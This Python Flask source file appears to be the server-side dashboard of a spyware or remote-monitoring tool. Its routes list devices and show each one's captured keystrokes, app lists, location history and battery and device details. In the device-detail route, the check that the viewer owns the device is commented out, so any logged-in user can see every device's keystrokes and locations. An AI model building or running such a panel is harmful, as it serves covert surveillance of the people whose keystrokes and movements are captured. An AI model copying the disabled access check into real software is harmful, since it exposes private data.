from flask import Blueprint, request, session, get_flashed_messages, flash, render_template, redirect, url_for
from models.devices import Device, DeviceInfo, Keystroke, AppInfo, DeviceLocation
from routes.auth import auth_required
from apis.devices import getDeviceInfo, getBatteryInfo
import ast
from logzero import logger

devices = Blueprint('devices', __name__)


def get_device_info(device_id, device_ip):
    device_details = DeviceInfo.query.filter_by(device_id=device_id).all()
    data_value = None
    if device_details:
        for info in device_details:
            if info.info_type == 'device_info':
                data_value = ast.literal_eval(info.data)
                return data_value
        response = getDeviceInfo(device_id, device_ip)
        return response
    else:
        response = getDeviceInfo(device_id, device_ip)
        return response
    
def get_battery_info(device_id, device_ip):
    device_details = DeviceInfo.query.filter_by(device_id=device_id).all()
    data_value = None
    if device_details:
        for info in device_details:
            if info.info_type == 'battery_info':
                data_value = ast.literal_eval(info.data)
                return data_value
        response = getBatteryInfo(device_id, device_ip)
        return response
    else:
        response = getBatteryInfo(device_id, device_ip)
        return response

@devices.route('/devices', methods=['GET'])
@auth_required
def get_devices():
    alert = get_flashed_messages()
    no_devices = False
    if len(alert) > 0:
        alert = alert[0]
    devices = Device.query.all()
    if len(devices) == 0:
        no_devices = True
    return render_template('pages/devices.html', devices=devices, alert=alert, no_devices=no_devices, get_device_info=get_device_info, get_battery_info=get_battery_info)


@devices.route('/device/<device_id>', methods=['GET'])
@auth_required
def get_device(device_id):
    device = Device.query.get(device_id)
    user_id = session.get('user_id')
    # if device.user_id != user_id:
    #     return redirect(url_for('devices.get_devices'))
    device_info = DeviceInfo.query.filter_by(
        device_id=device_id).order_by(DeviceInfo.timestamp.desc()).all()
    keystrokes = Keystroke.query.filter_by(
        device_id=device_id).order_by(Keystroke.timestamp.desc()).all()
    apps = AppInfo.query.filter_by(device_id=device_id).order_by(
        AppInfo.app_name.asc()).all()
    locations = DeviceLocation.query.filter_by(
        device_id=device_id).order_by(DeviceLocation.timestamp.desc()).all()
    return render_template('pages/device_details.html', device=device, device_info=device_info, keystrokes=keystrokes, apps=apps, locations=locations)